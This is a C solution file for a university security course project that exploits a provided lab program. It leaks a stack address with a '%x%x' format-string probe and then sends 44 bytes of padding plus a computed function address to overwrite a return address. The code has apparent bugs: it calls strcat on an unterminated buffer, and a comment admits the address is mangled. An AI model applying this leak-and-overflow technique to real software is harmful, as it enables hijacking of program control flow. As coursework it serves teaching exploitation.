/*
 * CSCI 368, Spring 2025
 * Project 1 | task1
 *
 * Build instructions:
 *   For grading, this will be built with the Makefile provided; you may not make
 *   any changes to the Makefile.  You can #include any other standard C
 *   libraries you want in this file, but none that require any compiler
 *   flags that aren't already in the Makefile.
 *
 */

#include <unistd.h>
#include <stdio.h>  // for fwrite()
#include <string.h> // for memset()
#include <stdlib.h> // for EXIT_SUCCESS
#include <stdint.h> // useful

#include "comms.h"  // for communicating with vulnerable

#define BUFFER_SIZE 64

int main()
{

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);  // Initialized to all zeroes

    /* TODO: You may change this string */
    char greeting[128] = "%x%x";

    /* Send our greeting to the vulnerable program and get the response */
    char response[512];
    ssize_t resplen;
    resplen = sendto_and_recvfrom_vulnerable(
		    greeting, sizeof(greeting)-1,   /* sent to vulnerable */
		    response, sizeof(response));    /* received from vulnerable */


    // Getting the memory location of the return address
    unsigned long sensitive_func = strtol(response+6, NULL, 16) - 61;

    // Allocating our buffers
    char* address = malloc(sizeof(char)*4);
    char* overflow = malloc(sizeof(char)*48);

    // Copying the memory address into our buffer
    memcpy(address, &sensitive_func, 4);

    // NOTE: 44 is the offset that gets us right to the return address
    // address is somehow misrepresented and gets interpreted as 0x39343038
    memset(overflow, 'x', 44);
    strcat(overflow, address);

    /* Send the buffer (expect no response) */
    sendto_vulnerable(overflow, 48); 

    return EXIT_SUCCESS;
}
